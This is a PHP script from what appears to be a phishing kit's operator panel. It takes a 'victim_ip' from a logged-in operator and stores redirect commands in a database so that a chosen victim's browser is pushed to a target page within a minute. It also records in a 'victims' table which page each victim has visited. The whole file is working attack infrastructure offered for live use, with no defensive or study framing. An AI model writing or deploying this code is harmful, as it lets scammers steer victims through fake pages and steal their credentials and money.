<?php
// push-redirect.php - INSTANT REDIRECT TRIGGER
session_start();
require_once __DIR__ . '/admin/auth.php';
require_once __DIR__ . '/config/database.php';

if (!is_logged_in()) {
    die(json_encode(['success' => false, 'error' => 'Unauthorized']));
}

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $victim_ip = $_POST['victim_ip'] ?? '';
    $target = $_POST['target'] ?? '';
    
    if (!$victim_ip) {
        echo json_encode(['success' => false, 'error' => 'No victim IP']);
        exit;
    }
    
    try {
        $database = new Database();
        $db = $database->getConnection();
        
        if ($target === 'clear') {
            // Clear redirects
            $delete = "DELETE FROM redirect_commands WHERE victim_ip = :ip";
            $db->prepare($delete)->execute([':ip' => $victim_ip]);
            
            $update_victim = "UPDATE victims SET page_visited = 'index.php' WHERE ip_address = :ip";
            $update_stmt = $db->prepare($update_victim);
            $update_stmt->execute([':ip' => $victim_ip]);
            
            echo json_encode(['success' => true, 'message' => 'Redirects cleared']);
            
        } else {
            // Set redirect - DELETE OLD COMMANDS FIRST
            $delete = "DELETE FROM redirect_commands WHERE victim_ip = :ip";
            $db->prepare($delete)->execute([':ip' => $victim_ip]);
            
            $insert = "INSERT INTO redirect_commands (command, target, victim_ip, expires_at) 
                      VALUES ('redirect', :target, :ip, NOW() + INTERVAL '1 minute')";
            $insert_stmt = $db->prepare($insert);
            $insert_stmt->execute([':target' => $target, ':ip' => $victim_ip]);
            
            $update_victim = "UPDATE victims SET page_visited = :target WHERE ip_address = :ip";
            $update_stmt = $db->prepare($update_victim);
            $update_stmt->execute([':target' => $target, ':ip' => $victim_ip]);
            
            echo json_encode(['success' => true, 'message' => 'INSTANT redirect sent']);
        }
        
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
}
?>